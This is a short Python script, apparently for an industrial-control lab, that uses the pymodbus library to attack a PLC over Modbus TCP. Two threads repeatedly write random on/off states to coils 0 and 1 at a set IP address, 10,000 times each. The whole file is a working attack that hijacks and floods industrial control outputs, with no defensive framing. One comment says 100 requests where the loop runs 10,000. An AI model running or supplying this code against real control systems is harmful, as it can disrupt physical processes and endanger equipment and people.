import threading
from pymodbus.client import ModbusTcpClient
import random
import time

# Target PLC IP and port
TARGET_IP = "172.18.0.11"  # Replace with the PLC's IP
TARGET_PORT = 502         # Default Modbus port

# Function to attack a specific contact
def attack_contact(thread_id, contact_address):
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    if client.connect():
        print(f"Thread {thread_id} connected to {TARGET_IP}:{TARGET_PORT}")
        for _ in range(10000):  # Send 100 toggle requests
            # Randomly toggle the contact's state
            state = random.choice([True, False])
            response = client.write_coil(contact_address, state)
            if not response.isError():
                print(f"Thread {thread_id} set Contact {contact_address} to {state}")
            else:
                print(f"Thread {thread_id} failed to write to Contact {contact_address}")
            time.sleep(0.05)  # Add a small delay to prevent immediate overrides
        client.close()
    else:
        print(f"Thread {thread_id} failed to connect.")

# Launch threads to attack both contacts simultaneously
threads = []
contacts = [0, 1]  # %IX0.0 (address 0) and %IX0.1 (address 1)

for thread_id, contact_address in enumerate(contacts):
    t = threading.Thread(target=attack_contact, args=(thread_id, contact_address))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
